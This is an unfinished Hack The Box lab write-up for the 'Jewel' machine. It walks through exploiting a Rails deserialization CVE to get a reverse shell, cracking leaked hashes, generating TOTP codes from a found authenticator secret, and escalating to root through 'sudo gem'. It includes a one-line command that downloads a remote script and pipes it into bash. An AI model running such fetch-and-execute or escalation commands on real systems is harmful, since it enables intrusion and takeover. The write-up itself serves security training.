## HTB - Jewel

## Overview

![Descriptive information card on the machine jewel](/assets/img/0-jewel-infocard.png)

Short description to include any strange things to be dealt with

TODO: finish writeup and clean up

## Useful Skills and Tools

### Execute a shell script payload without writing to disk

```bash
wget -O - -q $url:$port/$file | bash
```

* that extra \(`-`\) is important, don't leave it out!

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.211`.  The options I regularly use are: 

| `Flag` | Purpose |
| :--- | :--- |
| `-p-` | A shortcut which tells nmap to scan all ports |
| `-vvv` | Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown |
| `-sC` | Equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target |
| `-sV` | Does a service version scan |
| `-oA $name` | Saves all three formats \(standard, greppable, and XML\) of output with a filename of `$name` |

```

My nmap scan found only three open ports: 22 -SSH, 8000 - HTTP, and 8080 - HTTP.

### Port 8080 - HTTP

![](/assets/img/1-bl0g.png)

On the site hosted on port 8080 I found a "Bl0g" site.  While looking through the articles I found two potential usernames `bill` and `jennifer`. 

![](/assets/img/2-bibo-profile.png)

created an account, then logged in. 

![](/assets/img/2-edit-user.png)

On the profile page saw a 'edit profile' link and was hoping for a image upload box, but there wasn't anything useful as I could only update the username.

### Port 8000 - HTTP

![](/assets/img/3-git-bl0g.png)

On the web server hosted on port 8000 I found a git page for the "Bl0g".

![](/assets/img/3-git-bl0g-tree.png)

file tree

![](/assets/img/3-git-code-rails-ver.png)

The file `Gemfile` contained version information for all of the source files for the project, including the version of the Ruby on Rails Framework.

![](/assets/img/3-git-code-hashes.png)

in the git code I found a couple of password hashes, in the file bd.sql

![](/assets/img/3-git-code-hashes2.png)

I downloaded the git code for the site by clicking on the `snapshot` link.  I opened the SQL database locally but didn't find anything more that seemed useful in it, or in the rest of the code files.

```text

+\.
```

This also includes email addresses for the users with a domain of `mail.htb`.

While looking up version numbers for everything, I found an exploit for this version of git, but it looked to only work on Windows.

* [https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html](https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html)

Back in the code in the `Gemfile` I had found version numbers for rails 5.2.2.1. After searching for vulnerabilities for this version I found multiple CVEs that were related:

* [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8165](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8165)
* [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8164](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8164)
* [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5267](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5267)

I tried searching for exploits related to each CVE and came up with a POC for CVE-2020-8165.

* [https://www.cvebase.com/cve/2020/8165](https://www.cvebase.com/cve/2020/8165)

On cvebase there were eight POCs listed for this CVE which looked like a winner! I selected the one with the most upvotes which took me to a GitHub page.

* [https://github.com/masahiro331/CVE-2020-8165](https://github.com/masahiro331/CVE-2020-8165)

The instructions looked simple enough to follow, but I did not have rails installed, so I did that first.  Next, I created a new project called `test`. \(Had to change the name to `testing`, since 'test' is apparently a ruby/rails reserved key word.\)

After installing rails and starting my new project I got an error message saying some of the dependencies were not installed, so I had to run the `bundle install` command to install those as well. There was a long list of things it installed. 


> If you get any further errors make sure to read the errors and follow what they say.  Each error should be verbose enough to tell you what needs to be done to resolve the problem.


I had a lot of dependency issues, from yarn, webpacker, rails, and more...

I had to do the above steps to resolve the webpacker issues I was receiving. For some reason the gem version of yarn was causing problems, so I had to remove it and install it through npm.

After all of that work, it was pretty easy to follow the instructions in the POC to create the payload.

captured request to change the username on the 'edit profile' page in burp, then added my payload in place of the username field

On the exit profile page, got an error message after sending my payload in place of the username field, but  the payload still executed.

After sending my payload and sending another GET request for the profile page I got a connection back at my waiting netcat listener. I used the program `script` to save a transcript of all commands that I was about to run in the netcat shell, and made sure my listener was running in bash rather than `zsh`, since the latter causes issues when setting `stty raw -echo` when upgrading shells.

There was a few interesting hidden files in `bill`'s home folder, including one called `.google_authenticator`.

### User.txt

I was happy to see that `bill` had the `user.txt` flag in his home directory!

linpeas pointed out that there were a couple of files with password hashes. The second one was one that I had tried to crack unsuccessfully before, but the other was new. Since it was in a backups folder, it was possible that this was an old password that was used elsewhere

I copied the backup SQL file to my local machine and opened it up. There were a couple of new hashes in it, which I loaded into hashcat to try to crack.

For some reason hashcat could not identify the backup hashes as a valid bcrypt hash, but `john` was able to crack one of them almost immediately.

I checked `/etc/passwd` to see if there were any other users, but only `bill`, `postgres`, and `root` could log in.

It password ended up belonging to `bill`.  I tried using `sudo -l` again now that I had a password, but it asked for a verification code. This seemed like it may have been related to the `.google-authenticator` file I saw in `bill`'s home folder.

By default, three tokens are valid at any one time.  This accounts for
generated-but-not-used tokens and failed login attempts. In order to
decrease the likelihood of synchronization problems, this window can be
increased from its default size of 3 to 17. Do you want to do so? (y/n) y

If the computer that you are logging into isn't hardened against brute-force
login attempts, you can enable rate-limiting for the authentication module.
By default, this limits attackers to no more than 3 login attempts every 30s.

I was unable to setup a new google authenticator \(and somebody likes monty Python...\)

> The easiest way to generate codes is with oath-tool. It is available in the oath-toolkit package, and can be used as follows: `oathtool --totp -b ABC123` Where ABC123 is the secret key.

After installing `oathtool` and trying to generate totp using the code I had found, I noticed that the machine's time was GMT, and my system was not. This was causing my attempts to verify the OTP to fail.

```text

```

After setting my system to GMT I got a different sort of error. The time between the two machines was still off by a few minutes, which may have been still causing problems. I searched for ways to sync the times between the two machines

* [https://superuser.com/questions/577495/how-can-i-sync-date-time-in-two-computers](https://superuser.com/questions/577495/how-can-i-sync-date-time-in-two-computers)

date: invalid date ‘Mon 15 Feb 00:51:59 GMT 2021’
```

Unfortunately it seems not only are the time zones different, but the format of the date/time was different which made it so I couldn't sync automatically by using SSH.

After playing around with matching the times, I realized that the time zone, and date were wrong.

After getting the time synced, I was able to check the results of `sudo -l` finally:

```text
bill@jewel:~$ sudo -l
[sudo] password for bill: 
Verification code:

User bill may run the following commands on jewel:
    (ALL : ALL) /usr/bin/gem
```

After all of that trouble getting the OTP, I was glad to see there was a result!  Next, I searched for a way to do privilege escalation using `sudo gem` and found a post on GTFObins on how to do this.

* [https://gtfobins.github.io/gtfobins/gem/](https://gtfobins.github.io/gtfobins/gem/)

> This requires the name of an installed gem to be provided \(rdoc is usually installed\). `gem open -e "/bin/sh -c /bin/sh" rdoc`

### Getting a root shell

```text
bill@jewel:~$ sudo gem open -e "/bin/sh -c /bin/sh" rdoc
# id && hostname
uid=0(root) gid=0(root) groups=0(root)
jewel.htb
```

I ran the command from GTFObins with `sudo` and it immediately gave me a root shell.  It seemed to me that if I had been able to read the sudoers file I could have bypassed all of that trouble with OTPs. I wasn't sure why one wasn't required to run the command, unless I was still authenticated. I logged back out to test this.

```text
bill@jewel:~$ less /etc/sudoers
/etc/sudoers: Permission denied
```

I had forgotten to check this file earlier, but I was somewhat relieved that all of the pain that it took to sync the date and time wasn't in vain.

I was correct. There was a window in which I was able to enter commands with `sudo` without re-authenticating.

### Root.txt

```text
# ls -la

# cd ~
# ls

# cat root.txt

```

After that I collected my hard-earned proof, then set my clock back to normal!
